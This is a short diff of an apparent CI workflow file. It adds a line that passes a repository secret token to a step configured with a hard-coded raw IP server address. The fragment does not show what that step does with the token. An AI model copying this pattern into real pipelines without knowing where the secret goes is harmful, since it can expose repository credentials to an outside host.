@@ -43,3 +43,4 @@ jobs:
         with:
           server-url: 'http://129.154.46.198:3000'
           delay-seconds: '10'
+          github-token: ${{ secrets.TOKEN }}
